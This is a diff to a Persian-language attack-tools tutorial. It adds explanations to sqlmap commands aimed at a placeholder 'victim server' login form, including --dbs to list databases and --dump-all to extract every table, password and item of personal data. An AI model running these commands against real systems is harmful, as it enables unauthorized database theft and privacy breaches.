@@ -54,11 +54,27 @@ sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&passwo
   </ul>
 </p>
 
+<p dir="rtl" align="justify">هدف: پیدا کردن لیست دیتابیس‌های موجود (--dbs).</p>
+
+
 <p dir="rtl" align="justify">برای حمله پیشرفته‌تر:</p>
 
 ```
 sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --dump-all
 ```
+
+<p dir="rtl" align="justify">هدف: استخراج تمام داده‌های تمام جداول از تمام دیتابیس‌ها (--dump-all).</p>
+
+<p dir="rtl" align="justify">
+	<ul dir="rtl">
+	  <li>کاربرد:
+		<ul dir="rtl">
+		  <li>.نه تنها نام دیتابیس‌ها، بلکه تمامی جداول، رکوردها و اطلاعات حساس (مثل کاربران، پسوردها، اطلاعات شخصی) را دانلود می‌کند.</li>
+		  <li>.یک حمله کامل و تهاجمی است که تمام محتوای دیتابیس را افشا می‌کند.</li>
+		</ul>
+	  </li>
+	</ul>
+</p>
 
 # 3. curl
 
